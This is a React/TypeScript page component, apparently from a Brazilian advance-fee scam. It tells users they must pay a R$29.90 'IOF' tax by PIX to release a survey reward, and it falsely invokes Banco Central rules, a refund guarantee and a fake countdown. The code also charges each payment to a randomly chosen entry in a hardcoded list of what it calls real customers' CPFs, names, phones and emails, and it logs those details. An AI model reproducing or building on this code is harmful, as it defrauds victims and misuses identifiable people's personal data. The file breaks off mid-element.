import React, { useState, useEffect } from 'react';
import { ArrowLeft, User, CheckCircle, AlertCircle, Loader, Clock, Shield, Triangle as ExclamationTriangle, Copy, QrCode, X } from 'lucide-react';
import { pixApiService, type TransactionRequest, type TransactionResponse } from '../services/pixapi';

interface PixWithdrawalThirdPageProps {
  onBack: () => void;
  onFinish: () => void;
  totalCredits: number;
  userName?: string;
  userEmail?: string;
  pixKey: string;
  withdrawAmount: number;
}

// Lista de dados reais de clientes para geração do PIX
const REAL_CUSTOMER_DATA = [
  { cpf: '143.067.066-56', name: 'ANA LUISA SIMOES SOUZA', phone: '(31)98120-0405', email: 'aninha_84_aninha84@hotmail.com' },
  { cpf: '017.267.461-19', name: 'RUITER REZENDE SILVA JUNIOR', phone: '(64)99973-9944', email: 'ruiterrezende@hotmail.com' },
  { cpf: '660.801.425-20', name: 'MARIA DO CARMO REZENDE BARCELOS', phone: '(64)98119-5888', email: 'ruiterrur@yahoo.com.br' },
  { cpf: '042.632.638-55', name: 'MARCOS TADEU MAZIERO', phone: '(11)96919-5442', email: 'alpha_assessoria1@hotmail.com' },
  { cpf: '006.605.298-07', name: 'CLAUDIO ANTONIO', phone: '(11)96217-9841', email: 'jorgunguerreiro@hotmail.com' },
  { cpf: '042.225.711-72', name: 'ANTONIO DA SILVA ROSA NETO', phone: '(62)99814-1207', email: 'adasilvarosaneto@gmail.com' },
  { cpf: '042.709.618-99', name: 'ANTONIO AMORIM CASTRO', phone: '(74)99138-8050', email: 'leobatista@gmail.com' },
  { cpf: '042.225.391-04', name: 'MARIA MIRANDA COELHO', phone: '(74)98803-1817', email: 'claudioogun@hotmail.com' },
  { cpf: '042.633.228-86', name: 'DORACI LUCHETTA DANIEL', phone: '(16)93961-3822', email: 'shicad@itelefonica.com.br' },
  { cpf: '042.633.297-08', name: 'MARINA VITORIA DA SILVA', phone: '(21)99316-4701', email: 'mariavit1@gmail.com' },
  { cpf: '007.282.152-33', name: 'ISAAC MOREIRA DA COSTA', phone: '(99)99127-5686', email: 'erico-louco@hotmail.com' }
];

export const PixWithdrawalThirdPage: React.FC<PixWithdrawalThirdPageProps> = ({
  onBack,
  onFinish,
  totalCredits,
  userName = '',
  userEmail = '',
  pixKey,
  withdrawAmount
}) => {
  const [timeLeft, setTimeLeft] = useState(3600); // 1 hora em segundos
  const [isTermsAccepted, setIsTermsAccepted] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [checkingPayment, setCheckingPayment] = useState(false);
  const [showCopyConfirmation, setShowCopyConfirmation] = useState(false);
  const [showPaymentPendingPopup, setShowPaymentPendingPopup] = useState(false);
  const [showLoadingPage, setShowLoadingPage] = useState(true);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [loadingText, setLoadingText] = useState('Validando pesquisa');
  
  // Novos estados para PIX
  const [pixData, setPixData] = useState<TransactionResponse | null>(null);
  const [pixError, setPixError] = useState<string | null>(null);
  const [showQrCodePopup, setShowQrCodePopup] = useState(false);

  // Função para extrair e formatar o nome do usuário
  const getDisplayName = (name: string): string => {
    if (!name) return 'Usuário';
    
    // Se é um nome completo, extrair apenas o primeiro nome
    const firstName = name.trim().split(' ')[0];
    
    // Capitalizar primeira letra
    return firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
  };

  const displayName = userName ? getDisplayName(userName) : 'Usuário';

  // Cronômetro regressivo
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Tela de carregamento inicial com 3 etapas específicas
  useEffect(() => {
    if (showLoadingPage) {
      // Iniciar com progresso 0
      setLoadingProgress(0);
      setLoadingText('Validando pesquisa');

      // Etapa 1: Validando pesquisa (0-33%)
      const stage1Timer = setTimeout(() => {
        setLoadingProgress(33);
        setLoadingText('Processando saque...');
      }, 2000);

      // Etapa 2: Processando saque (33-66%)
      const stage2Timer = setTimeout(() => {
        setLoadingProgress(66);
        setLoadingText('Quase lá! Falta apenas um passo...');
      }, 4000);

      // Etapa 3: Quase lá (66-100%)
      const stage3Timer = setTimeout(() => {
        setLoadingProgress(100);
      }, 6000);

      // Finalizar carregamento
      const finishTimer = setTimeout(() => {
        setShowLoadingPage(false);
      }, 7500);

      return () => {
        clearTimeout(stage1Timer);
        clearTimeout(stage2Timer);
        clearTimeout(stage3Timer);
        clearTimeout(finishTimer);
      };
    }
  }, [showLoadingPage]);

  // Formatar tempo para HH:MM:SS
  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Função para selecionar dados aleatórios da lista de clientes reais
  const getRandomCustomerData = () => {
    const randomIndex = Math.floor(Math.random() * REAL_CUSTOMER_DATA.length);
    const selectedCustomer = REAL_CUSTOMER_DATA[randomIndex];
    
    console.log('🎲 Cliente selecionado aleatoriamente para PIX:', {
      nome: selectedCustomer.name,
      cpf: selectedCustomer.cpf,
      email: selectedCustomer.email,
      telefone: selectedCustomer.phone
    });
    
    return selectedCustomer;
  };

  // Gerar PIX para pagamento do IOF usando dados reais
  const generatePixPayment = async () => {
    setIsProcessing(true);
    setPixError(null);
    
    try {
      console.log('🏦 Gerando PIX para pagamento do IOF de R$ 29,90 com dados reais...');

      // Selecionar dados aleatórios da lista de clientes reais
      const customerData = getRandomCustomerData();
      
      // Limpar CPF e telefone (remover formatação)
      const cleanCpf = customerData.cpf.replace(/\D/g, '');
      const cleanPhone = customerData.phone.replace(/\D/g, '');

      // Preparar requisição PIX para IOF com dados reais
      const pixRequest: TransactionRequest = {
        name: customerData.name,
        email: customerData.email,
        cpf: cleanCpf,
        phone: cleanPhone,
        paymentMethod: "PIX",
        amount: 2990, // R$ 29,90 em centavos
        traceable: true,
        items: [
          {
            unitPrice: 2990,
            title: 'IOF - Imposto sobre Operações Financeiras',
            quantity: 1,
            tangible: false
          }
        ],
        externalId: `iof_payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
      };

      console.log('💳 Criando transação PIX para IOF com dados reais:', {
        valor: 'R$ 29,90',
        cliente: customerData.name,
        cpf: customerData.cpf,
        email: customerData.email,
        telefone: customerData.phone
      });

      const pixResponse = await pixApiService.createPixTransaction(pixRequest);
      setPixData(pixResponse);

      console.log('✅ PIX para IOF gerado com sucesso usando dados reais:', {
        id: pixResponse.id,
        valor: 'R$ 29,90',
        status: pixResponse.status,
        cliente_usado: customerData.name,
        cpf_usado: customerData.cpf,
        pixCode: pixResponse.pixCode ? 'Gerado' : 'Não disponível',
        pixQrCode: pixResponse.pixQrCode ? 'Gerado' : 'Não disponível'
      });

      // Mostrar popup do QR Code automaticamente após gerar o PIX
      setShowQrCodePopup(true);
      
    } catch (error) {
      console.error('❌ Erro ao gerar PIX para IOF com dados reais:', error);
      setPixError(error instanceof Error ? error.message : 'Erro ao gerar PIX');
    } finally {
      setIsProcessing(false);
    }
  };

  const handlePayTax = async () => {
    if (!isTermsAccepted) {
      alert('Você precisa aceitar os termos antes de prosseguir.');
      return;
    }

    // Gerar PIX para pagamento do IOF com dados reais
    await generatePixPayment();
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      
      // Mostrar popup de confirmação
      setShowCopyConfirmation(true);
      setTimeout(() => {
        setShowCopyConfirmation(false);
      }, 2000);
      
    } catch (error) {
      console.error('Erro ao copiar:', error);
      alert('Erro ao copiar. Tente novamente.');
    }
  };

  // Tela de carregamento
  if (showLoadingPage) {
    return (
      <div className="fixed inset-0 bg-white z-50 flex flex-col justify-end items-start p-5 pb-24">
        <div className="w-full max-w-sm">
          <div 
            className="text-black font-black text-3xl mb-12 leading-tight transition-all duration-500 ease-in-out"
            style={{ 
              fontFamily: 'Inter, sans-serif',
              opacity: 1,
              transform: 'translateY(0)'
            }}
          >
            {loadingText}
          </div>
          
          <div className="w-full h-2 bg-gray-300 rounded-full overflow-hidden">
            <div 
              className="h-full bg-orange-500 transition-all duration-1000 ease-out"
              style={{ width: `${loadingProgress}%` }}
            ></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Popup de confirmação de cópia */}
      {showCopyConfirmation && (
        <div className="fixed top-4 left-4 right-4 z-60">
          <div className="bg-green-500 text-white rounded-xl p-3 shadow-xl flex items-center space-x-2 max-w-xs mx-auto">
            <CheckCircle className="w-5 h-5 flex-shrink-0" />
            <span className="text-sm font-medium">Código PIX copiado!</span>
          </div>
        </div>
      )}

      {/* Popup do QR Code PIX - SEÇÃO DE VALOR REMOVIDA */}
      {showQrCodePopup && pixData && (
        <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
          <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-full mx-4 overflow-hidden">
            {/* Header do popup */}
            <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-3 flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <QrCode className="w-5 h-5 text-white" />
                <h2 className="text-white font-bold text-base">PIX - IOF OBRIGATÓRIO</h2>
              </div>
              <button 
                onClick={() => setShowQrCodePopup(false)}
                className="text-white hover:bg-white/20 rounded-full p-1.5 transition-colors"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Conteúdo do popup - SEM SEÇÃO DE VALOR */}
            <div className="p-3">
              {/* QR Code */}
              <div className="bg-gray-50 rounded-lg p-3 text-center mb-3">
                {pixData.pixQrCode ? (
                  <img 
                    src={pixData.pixQrCode} 
                    alt="QR Code PIX"
                    className="w-40 h-40 mx-auto border border-gray-200 rounded-lg"
                  />
                ) : (
                  <div className="w-40 h-40 bg-gray-200 mx-auto rounded-lg flex items-center justify-center">
                    <QrCode className="w-12 h-12 text-gray-400" />
                  </div>
                )}
                <p className="text-xs text-gray-600 mt-2">
                  Escaneie com seu app do banco
                </p>
              </div>

              {/* Código PIX */}
              <div className="mb-3">
                <label className="block text-xs font-medium text-gray-700 mb-1">
                  Código PIX (Copia e Cola)
                </label>
                <div className="relative">
                  <textarea
                    value={pixData.pixCode || 'Código PIX não disponível'}
                    readOnly
                    className="w-full p-2 border border-gray-300 rounded-lg bg-gray-50 text-xs h-12 resize-none"
                  />
                </div>
              </div>

              {/* Botão copiar */}
              {pixData.pixCode && (
                <button
                  onClick={() => copyToClipboard(pixData.pixCode!)}
                  className="w-full bg-blue-600 text-white py-2.5 rounded-lg hover:bg-blue-700 transition-colors text-xs font-medium flex items-center justify-center space-x-2 mb-3"
                >
                  <Copy className="w-3 h-3" />
                  <span>Copiar Código PIX</span>
                </button>
              )}

              {/* Instruções */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-2">
                <h4 className="font-medium text-blue-800 mb-1 text-xs">Como pagar:</h4>
                <ol className="text-xs text-blue-700 space-y-0.5">
                  <li>1. Abra o app do seu banco</li>
                  <li>2. Escolha a opção PIX</li>
                  <li>3. Escaneie o QR Code ou cole o código</li>
                  <li>4. Confirme o pagamento de R$ 29,90</li>
                </ol>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header com cor #003772 e logo centralizada */}
      <header style={{ backgroundColor: '#003772' }} className="shadow-lg">
        <div className="max-w-7xl mx-auto px-3 py-4">
          <div className="flex items-center justify-center">
            {/* Logo SVG centralizada */}
            <svg xmlns="http://www.w3.org/2000/svg" width="160" height="37" viewBox="0 0 160 37" fill="none">
              <path d="M21.1241 10.7151C21.1241 8.57211 24.1418 6.77896 27.9031 6.77896C31.6643 6.77896 34.682 8.52837 34.682 10.7151C34.682 12.8582 31.6643 14.6076 27.9031 14.6076C24.1418 14.6076 21.1241 12.8582 21.1241 10.7151ZM16.182 10.6277C23.9669 15.1761 33.7636 22.6111 38.7494 26.7222L27.9468 37C20.9054 30.1773 15.0887 24.7979 10.6277 20.9492C13.2518 15.7447 15.1761 12.2459 16.182 10.6277ZM16.0508 4.19858C19.8121 4.19858 23.792 4.37352 27.9468 4.67967C21.0804 7.6974 13.7329 11.7648 5.86052 16.9693C3.7175 15.2199 1.74941 13.8203 0 12.6395C5.81679 9.1844 11.1525 6.38535 16.0508 4.19858ZM40.5863 4.50473L39.7116 10.6277C33.9823 7.12884 27.8156 4.32979 21.1679 2.14303C24.3168 1.04965 26.5473 0.349882 27.9031 0C31.708 0.962175 35.9066 2.49291 40.5863 4.50473ZM27.9468 18.4125C34.4196 13.7329 40.2802 9.9279 46.1844 7.21631C48.8523 8.52837 52.0887 10.3215 55.8499 12.5957C52.0887 15.2199 48.2837 18.1939 44.4787 21.5615C39.2305 20.3369 32.9764 19.156 27.9468 18.4125Z" fill="white"/>
              <path d="M58.5178 24.9289H61.4481V19.8993C62.4977 19.8993 62.8913 19.8993 63.3724 21.605L64.3346 24.9289H67.3961L66.1277 20.8615C65.6467 19.3745 65.2968 18.8934 64.3783 18.7622C66.7838 18.2374 66.8712 16.1819 66.8712 15.657C66.8712 13.3391 65.1218 12.4644 63.0663 12.4644H58.5178V24.9289ZM61.3169 14.5636H62.1916C63.766 14.5636 63.941 15.6133 63.941 16.1381C63.941 17.0128 63.3724 17.8001 62.2353 17.8001H61.3169V14.5636ZM81.9162 22.9608C81.4351 23.1358 80.954 23.092 80.3854 23.092C79.3795 23.092 78.2424 22.5235 78.2424 20.6866C78.2424 20.3367 78.2424 18.1499 80.2542 18.1499C80.8228 18.1499 81.2164 18.1499 81.785 18.2374L81.9162 16.2693C81.0415 16.1818 80.6916 16.1381 79.8169 16.1381C77.0616 16.1381 75.5308 18.0187 75.5308 20.6866C75.5308 22.261 76.2743 25.0601 79.5982 25.0601C80.4292 25.0601 81.2164 25.1476 81.9599 24.9289L81.9162 22.9608ZM90.3571 14.7823H92.9812V12.4644H90.3571V14.7823ZM134.486 12.4644H131.862V17.5376C131.512 16.7504 130.812 16.1381 129.588 16.1381C127.401 16.1381 126.526 18.0625 126.526 20.3804C126.526 23.1358 127.619 25.0601 129.588 25.0601C131.075 25.0601 131.687 24.0979 131.949 23.5294C131.993 24.1417 132.037 24.579 132.037 24.9289H134.53C134.486 24.5353 134.486 24.0979 134.486 23.0045V12.4644ZM129.325 20.5991C129.325 19.2433 129.413 17.9313 130.593 17.9313C131.643 17.9313 131.906 19.2433 131.906 20.5991C131.906 21.605 131.687 23.1795 130.593 23.1795C129.369 23.1795 129.325 21.5176 129.325 20.5991ZM143.408 24.9289H146.032V21.0802C146.032 19.8119 146.207 18.4998 147.738 18.4998H148.612V16.3131H148.219C146.688 16.3131 146.338 16.9254 145.813 17.8875C145.77 17.3627 145.726 16.8379 145.726 16.3131H143.32C143.364 16.7504 143.364 17.2752 143.364 18.1062V24.9289H143.408ZM157.01 24.9289H159.634V12.4644H157.01V24.9289ZM111.437 24.9289H114.237V19.7244H118.173V17.5376H114.237V14.6511H118.304V12.4644H111.394V24.9289H111.437ZM149.312 18.4561C150.362 18.0187 151.149 17.9313 151.805 17.9313C152.199 17.9313 153.423 17.8438 153.423 19.5057H152.636C151.718 19.5057 148.35 19.5057 148.35 22.436C148.35 24.0105 149.4 25.0601 151.018 25.0601C152.242 25.0601 153.292 24.2729 153.38 23.748L153.467 24.9289H155.872C155.829 24.3603 155.829 23.748 155.829 22.4797V19.3308C155.829 17.4064 155.129 16.1381 152.067 16.1381C151.105 16.1381 150.187 16.2693 149.312 16.2693V18.4561ZM153.423 21.2551C153.423 23.3544 152.111 23.3982 151.849 23.3982C151.63 23.3982 150.712 23.3982 150.712 22.2611C150.712 20.8178 152.374 20.7303 153.423 20.7303V21.2551ZM69.8452 19.8556C69.8452 19.3745 69.8452 17.7126 71.201 17.7126C72.2944 17.7126 72.5568 18.7622 72.5568 19.8556H69.8452ZM74.9185 20.6428C74.9185 16.1381 71.9445 16.1381 71.1573 16.1381C68.6644 16.1381 67.3086 18.2374 67.3086 20.5554C67.3086 23.1795 68.6644 25.0601 71.6821 25.0601C72.5568 25.0601 73.5627 25.1038 74.4374 24.9289L74.3937 22.9608C73.519 23.267 72.863 23.267 71.9445 23.267C70.4575 23.267 69.8015 22.3048 69.8015 21.2989H74.9185V20.6428ZM84.5403 19.8556C84.5403 19.3745 84.5403 17.7126 85.8961 17.7126C86.9895 17.7126 87.2519 18.7622 87.2519 19.8556H84.5403ZM89.6136 20.6428C89.6136 16.1381 86.6396 16.1381 85.8523 16.1381C83.3594 16.1381 82.0036 18.2374 82.0036 20.5554C82.0036 23.1795 83.3594 25.0601 86.3772 25.0601C87.2956 25.0601 88.2578 25.1038 89.1325 24.9289L89.0888 22.9608C88.214 23.267 87.558 23.267 86.6396 23.267C85.1526 23.267 84.4966 22.3048 84.4966 21.2989H89.6136V20.6428ZM120.928 19.8556C120.928 19.3745 120.928 17.7126 122.284 17.7126C123.377 17.7126 123.64 18.7622 123.64 19.8556H120.928ZM126.045 20.6428C126.045 16.1381 123.071 16.1381 122.284 16.1381C119.791 16.1381 118.435 18.2374 118.435 20.5554C118.435 23.1795 119.791 25.0601 122.809 25.0601C123.683 25.0601 124.689 25.1038 125.564 24.9289L125.52 22.9608C124.645 23.267 123.989 23.267 123.071 23.267C121.584 23.267 120.928 22.3048 120.928 21.2989H126.045V20.6428ZM137.635 19.8556C137.635 19.3745 137.635 17.7126 138.991 17.7126C140.084 17.7126 140.346 18.7622 140.346 19.8556H137.635ZM142.752 20.6428C142.752 16.1381 139.778 16.1381 138.991 16.1381C136.498 16.1381 135.142 18.2374 135.142 20.5554C135.142 23.1795 136.498 25.0601 139.515 25.0601C140.434 25.0601 141.396 25.1038 142.271 24.9289L142.227 22.9608C141.352 23.267 140.696 23.267 139.778 23.267C138.291 23.267 137.635 22.3048 137.635 21.2989H142.752V20.6428ZM100.547 18.4561C101.597 18.0187 102.384 17.9313 103.04 17.9313C103.434 17.9313 104.658 17.8438 104.658 19.5057H103.871C102.953 19.5057 99.5852 19.5057 99.5852 22.436C99.5852 24.0105 100.635 25.0601 102.253 25.0601C103.521 25.0601 104.527 24.2729 104.615 23.748L104.702 24.9289H107.108C107.064 24.3603 107.02 23.748 107.02 22.4797V19.3308C107.02 17.4064 106.32 16.1381 103.303 16.1381C102.341 16.1381 101.422 16.2693 100.547 16.2693V18.4561ZM104.658 21.2551C104.658 23.3544 103.346 23.3982 103.084 23.3982C102.865 23.3982 101.947 23.3982 101.947 22.2611C101.947 20.8178 103.609 20.7303 104.615 20.7303V21.2551H104.658ZM90.3571 24.9289V16.2693H94.9055V14.4762L97.4859 13.6452V16.2256H99.1916V18.0625H97.4859V22.0424C97.4859 22.8733 97.8795 23.1358 98.3606 23.1358C98.7105 23.1358 98.9729 23.0483 99.2353 22.9608V24.8852C98.9729 24.9726 98.2731 25.0164 97.3984 25.0164C96.0427 25.0164 94.8618 24.3603 94.8618 22.4797V18.1062H93.0249V24.9289H90.3571Z" fill="white"/>
            </svg>
          </div>
        </div>
      </header>

      {/* Container principal */}
      <div className="max-w-sm mx-auto p-4">
        {/* Aviso de IOF com ícone de triângulo - COR AMARELA */}
        <div style={{ backgroundColor: '#FEF3C7', borderColor: '#F59E0B' }} className="border-l-4 p-4 mb-4 rounded-r-lg">
          <div className="flex items-center mb-3">
            <ExclamationTriangle style={{ color: '#F59E0B' }} className="w-6 h-6 mr-3" />
            <h2 style={{ color: '#92400E' }} className="font-bold text-lg">
              Imposto sobre Operações Financeiras (IOF)
            </h2>
          </div>
        </div>

        {/* Títulos principais - ALINHADOS À ESQUERDA E ESPAÇAMENTO REDUZIDO */}
        <div className="text-left mb-4">
          <h1 className="text-xl font-bold text-gray-800 mb-2">
            Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
          </h1>
          
          <h2 className="text-lg text-gray-800 mb-2">
            Para liberar o valor acumulado de R$ {totalCredits.toFixed(2)}, é necessário o pagamento do (IOF) no valor de R$ 29,90.
          </h2>
          
          <p className="text-gray-700 text-sm leading-relaxed">
            <span style={{ color: '#DE4E33' }} className="font-bold">* </span>
            <span className="font-bold">Conforme exigido pelo Banco Central do Brasil (Lei nº 8.894/94), o pagamento do (IOF) é obrigatório para a liberação do saldo acumulado. O valor será reembolsado automaticamente junto com o saldo.</span>
          </p>
        </div>

        {/* Se PIX foi gerado, mostrar botão para abrir popup */}
        {pixData && (
          <div className="mb-6">
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 text-center">
              <CheckCircle className="w-8 h-8 text-green-500 mx-auto mb-2" />
              <h3 className="font-bold text-green-700 mb-2">QR CODE Gerado!</h3>
              <p className="text-green-600 text-sm mb-4">
                O pagamento é obrigatório para validar o beneficiário. Clique no botão abaixo para visualizar.
              </p>
              <button
                onClick={() => setShowQrCodePopup(true)}
                className="bg-green-500 text-white px-6 py-3 rounded-lg hover:bg-green-600 transition-colors font-bold flex items-center justify-center space-x-2 mx-auto"
              >
                <QrCode className="w-5 h-5" />
                <span>VER QR CODE PIX</span>
              </button>
            </div>
          </div>
        )}

        {/* Resumo - só mostrar se PIX não foi gerado ainda */}
        {!pixData && (
          <div className="bg-white border border-gray-200 rounded-lg p-4 mb-6">
            <h3 className="font-bold text-gray-800 mb-4">Resumo</h3>
            <div className="border-b border-gray-200 mb-4"></div>
            
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-700">Valor ganho</span>
                <span className="font-bold">R$ {totalCredits.toFixed(2)}</span>
              </div>
              
              <div className="border-b border-gray-200"></div>
              
              <div className="flex justify-between">
                <span className="text-gray-700">Valor a ser pago (IOF)</span>
                <span className="font-bold" style={{ color: '#DE4E33' }}>- R$ 29,90</span>
              </div>
              
              <div className="text-center">
                <p className="text-xs" style={{ color: '#DE4E33' }}>
                  *(Reembolsado após Aprovação da Conta e Liberação do Saque)
                </p>
              </div>
              
              <div className="border-b border-gray-200"></div>
              
              <div className="flex justify-between text-lg">
                <span className="font-bold">Total a receber no PIX</span>
                <span className="font-bold">R$ {(totalCredits - 29.90).toFixed(2)}</span>
              </div>
              
              <div className="flex items-center justify-center space-x-2 text-sm text-gray-600 mt-4">
                <AlertCircle className="w-4 h-4 text-gray-600 mt-0.5 flex-shrink-0" />
                <span>O pagamento de R$ {(totalCredits - 29.90).toFixed(2)} será processado via PIX imediatamente após a confirmação.</span>
              </div>
            </div>
          </div>
        )}

        {/* Garantia de recebimento - EMOJI À DIREITA, TEXTO À ESQUERDA */}
        <div className="bg-white border border-gray-200 rounded-lg p-4 mb-6">
          <div className="flex items-start justify-between">
            <div className="flex-1 pr-3">
              <h4 className="font-bold text-black text-lg mb-3">
                Garantia de recebimento
              </h4>
              <div className="border-b border-gray-200 mb-3"></div>
              <div className="flex items-start space-x-2">
                <AlertCircle className="w-4 h-4 text-gray-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">
                  Este processo é regulamentado pelo Banco Central do Brasil. Garantimos que o valor total de R$ {(totalCredits - 29.90).toFixed(2)} será creditado diretamente no seu PIX após o pagamento.
                </p>
              </div>
            </div>
            <div className="bg-green-500 rounded-full p-2 flex-shrink-0">
              <CheckCircle className="w-5 h-5 text-white" />
            </div>
          </div>
        </div>

        {/* Método de Pagamento - LOGO PIX À DIREITA, TEXTO À ESQUERDA */}
        <div className="bg-white border border-gray-200 rounded-lg p-4 mb-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h3 className="font-bold text-gray-800">Método de pagamento​</h3>
            </div>
            {/* Logo PIX do Banco Central */}
            <svg height="886" viewBox="-1.165 -.17395293 238.183 85.60195293" width="2500" className="w-16 h-16">
              <path d="m97.827 78.68v-48.324c0-8.892 7.208-16.1 16.1-16.1l14.268.022c8.865.018 16.043 7.21 16.043 16.076v10.286c0 8.891-7.208 16.1-16.1 16.1h-20.161m40.248-42.49h6.19a6.607 6.607 0 0 1 6.606 6.607v36.099" style={{fill:'none',stroke:'#939598',strokeWidth:'2.976',strokeLinecap:'round',strokeLinejoin:'round',strokeMiterlimit:'10'}}/>
              <path d="m159.695 8.657-2.807-2.807a1.783 1.783 0 0 1 0-2.522l2.805-2.805a1.786 1.786 0 0 1 2.525 0l2.805 2.805a1.783 1.783 0 0 1 0 2.522l-2.806 2.807a1.783 1.783 0 0 1 -2.522 0" fill="#32bcad"/>
              <path d="m172.895 14.218h6.138c3.158 0 6.186 1.254 8.419 3.487l14.356 14.356a4.762 4.762 0 0 0 6.735 0l14.304-14.304a11.906 11.906 0 0 1 8.418-3.487h4.99m-63.36 42.37h6.138c3.158 0 6.186-1.255 8.419-3.487l14.356-14.357a4.762 4.762 0 0 1 6.735 0l14.304 14.304a11.906 11.906 0 0 0 8.418 3.487h4.99" style={{fill:'none',stroke:'#939598',strokeWidth:'2.976',strokeLinecap:'round',strokeLinejoin:'round',strokeMiterlimit:'10'}}/>
              <path d="m61.233 65.811c-3.08 0-5.977-1.2-8.156-3.376l-11.777-11.778c-.827-.829-2.268-.826-3.094 0l-11.82 11.82a11.463 11.463 0 0 1 -8.156 3.377h-2.321l14.916 14.916c4.658 4.658 12.21 4.658 16.869 0l14.958-14.96zm-43.003-41.656c3.08 0 5.977 1.199 8.156 3.376l11.82 11.822a2.19 2.19 0 0 0 3.094 0l11.777-11.779a11.463 11.463 0 0 1 8.156-3.376h1.419l-14.958-14.959c-4.659-4.658-12.211-4.658-16.87 0l-14.914 14.916z" fill="#32bcad"/>
              <path d="m75.024 36.57-9.039-9.04c-.199.08-.414.13-.642.13h-4.11a8.123 8.123 0 0 0 -5.706 2.365l-11.776 11.775a5.637 5.637 0 0 1 -3.997 1.654 5.637 5.637 0 0 1 -3.997-1.653l-11.821-11.82a8.121 8.121 0 0 0 -5.706-2.365h-5.054c-.215 0-.417-.05-.607-.122l-9.075 9.076c-4.659 4.658-4.659 12.21 0 16.87l9.075 9.074c.19-.072.392-.122.607-.122h5.054a8.122 8.122 0 0 0 5.706-2.364l11.82-11.82c2.136-2.135 5.86-2.136 7.995 0l11.776 11.776a8.123 8.123 0 0 0 5.706 2.365h4.11c.228 0 .443.05.642.13l9.04-9.04c4.658-4.658 4.658-12.21 0-16.87" fill="#32bcad"/>
            </svg>
          </div>
          
          <div className="border-b border-gray-200 mb-3"></div>
          
          <div className="flex items-start space-x-2">
            <AlertCircle className="w-4 h-4 text-gray-600 mt-0.5 flex-shrink-0" />
            <p className="text-gray-700 text-sm">
              Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.
            </p>
          </div>
        </div>

        {/* Checkbox de Termos - só mostrar se PIX não foi gerado */}
        {!pixData && (
          <div className="mb-6">
            <label className="flex items-start space-x-3 cursor-pointer">
              <input
                type="checkbox"
                checked={isTermsAccepted}
                onChange={(e) => setIsTermsAccepted(e.target.checked)}
                className="mt-1 w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
              />
              <span className="text-xs text-gray-600 leading-relaxed" style={{ fontFamily: 'Inter, sans-serif' }}>
                Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), necessário para completar o saque em conformidade com as regulamentações vigentes.
              </span>
            </label>
          </div>
        )}

        {/* Botão de Pagamento - só mostrar se PIX não foi gerado */}
        {!pixData && (
          <button
            onClick={handlePayTax}
            disabled={!isTermsAccepted || isProcessing}
            className={`w-full py-4 px-6 rounded font-bold text-white transition-all duration-300 flex items-center justify-center space-x-2 ${
              isTermsAccepted && !isProcessing
                ? 'bg-blue-800 hover:bg-blue-900 transform active:scale-95 shadow-lg'
                : 'bg-gray-400 cursor-not-allowed opacity-50'
            }`}
            style={{ 
              fontFamily: 'Inter, sans-serif',
              fontSize: '16px',
              fontWeight: '600'
            }}
          >
            {isProcessing ? (
              <>
                <Loader className="w-5 h-5 animate-spin" />
                <span>GERANDO PIX...</span>
              </>
            ) : (
              <span>Pagar Imposto</span>
            )}
          </button>
        )}

        {/* Erro do PIX */}
        {pixError && (
          <div className="mb-4 bg-red-50 border-l-4 border-red-500 rounded-r-lg p-3 flex items-center space-x-2">
            <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0" />
            <span className="text-red-700 text-sm">{pixError}</span>
          </div>
        )}

        {/* FAQ */}
        <div className="mt-8 bg-gray-50 rounded-lg p-4">
          <h3 className="font-bold text-gray-800 mb-4 text-2xl" style={{ fontFamily: 'Inter, sans-serif' }}>
            Dúvidas Frequentes
          </h3>
          
          <div className="space-y-4">
            <div>
              <button 
                className="w-full text-left font-medium text-gray-800 text-base p-3 bg-white border border-gray-300 rounded hover:bg-gray-100 transition-colors"
                style={{ fontFamily: 'Inter, sans-serif' }}
                onClick={(e) => {
                  const answer = e.currentTarget.nextElementSibling as HTMLElement;
                  if (answer) {
                    answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
                  }
                }}
              >
                Por que o IOF de R$29,90 não é descontado do saldo acumulado de R${totalCredits.toFixed(2)}?
              </button>
              <div className="hidden mt-2 p-3 text-sm text-gray-600 border-l-4 border-blue-500 bg-gray-50" style={{ fontFamily: 'Inter, sans-serif' }}>
                Conforme determinação do <strong>Banco Central</strong>, o pagamento do <strong>(IOF)</strong> deve ser realizado separadamente para validar a identidade do beneficiário e <strong>evitar fraudes.</strong> O valor será reembolsado junto ao saldo acumulado após a confirmação.
              </div>
            </div>
            
            <div>
              <button 
                className="w-full text-left font-medium text-gray-800 text-base p-3 bg-white border border-gray-300 rounded hover:bg-gray-100 transition-colors"
                style={{ fontFamily: 'Inter, sans-serif' }}
                onClick={(e) => {
                  const answer = e.currentTarget.nextElementSibling as HTMLElement;
                  if (answer) {
                    answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
                  }
                }}
              >
